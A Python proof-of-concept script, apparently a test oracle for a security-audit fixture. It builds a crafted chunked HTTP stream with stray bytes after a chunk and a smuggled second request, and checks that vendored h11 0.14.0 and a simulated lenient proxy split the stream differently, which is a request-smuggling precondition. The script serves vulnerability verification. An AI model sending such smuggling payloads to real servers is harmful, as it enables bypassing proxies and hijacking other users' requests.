#!/usr/bin/env python3
"""Reproduce the h11 0.14.0 chunked-footer disagreement inside the staged fixture.

Run from the staged audit root (the directory that contains ``h11/``). Exits 0
and prints ``POC_VERIFIED`` only when the vendored h11 and a lenient proxy both
accept the stream but delimit it differently, which is the request-smuggling
precondition. This is the fixture oracle for ``chunked-trailer-not-validated``;
it demonstrates the precondition, not a completed exploit.
"""
import sys

sys.path.insert(0, ".")

import h11  # vendored h11 0.14.0

STREAM = (
    b"POST /one HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"5\r\n"
    b"AAAAAXX2\r\n"
    b"45\r\n"
    b"0\r\n"
    b"\r\n"
    b"GET /two HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"0\r\n"
    b"\r\n"
)


def h11_view(data: bytes):
    conn = h11.Connection(h11.SERVER)
    conn.receive_data(data)
    requests, current = [], None
    while True:
        event = conn.next_event()
        if event is h11.NEED_DATA or event is h11.PAUSED:
            break
        if isinstance(event, h11.Request):
            current = {"target": event.target.decode(), "body": b""}
            requests.append(current)
        elif isinstance(event, h11.Data):
            current["body"] += bytes(event.data)
        elif isinstance(event, h11.EndOfMessage):
            current = None
            conn.send(h11.Response(status_code=200, headers=[(b"content-length", b"0")]))
            conn.send(h11.EndOfMessage())
            conn.start_next_cycle()
        elif isinstance(event, h11.ConnectionClosed):
            break
    return requests


def lenient_view(data: bytes):
    """A proxy that reads to the next CRLF after each chunk (the advisory bug)."""
    requests, pos = [], 0
    while pos < len(data):
        end = data.find(b"\r\n\r\n", pos)
        if end < 0:
            break
        head = data[pos:end].decode("latin1")
        pos = end + 4
        lines = head.split("\r\n")
        target = lines[0].split(" ")[1]
        body = b""
        if any("transfer-encoding: chunked" in line.lower() for line in lines[1:]):
            while pos < len(data):
                nl = data.find(b"\r\n", pos)
                if nl < 0:
                    break
                size = int(data[pos:nl].split(b";")[0], 16)
                pos = nl + 2
                if size == 0:
                    break
                body += data[pos : pos + size]
                pos += size
                nl = data.find(b"\r\n", pos)
                if nl < 0:
                    pos = len(data)
                    break
                pos = nl + 2
        requests.append({"target": target, "body": body})
        while data[pos : pos + 2] == b"\r\n":
            pos += 2
    return requests


def main() -> int:
    strict = h11_view(STREAM)
    lenient = lenient_view(STREAM)
    if len(strict) == 2 and len(lenient) == 1:
        print(
            "POC_VERIFIED: h11 and the lenient proxy delimit the same stream "
            "differently (request-smuggling precondition)"
        )
        return 0
    print(f"POC_NOT_REPRODUCED: h11={len(strict)} lenient={len(lenient)}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
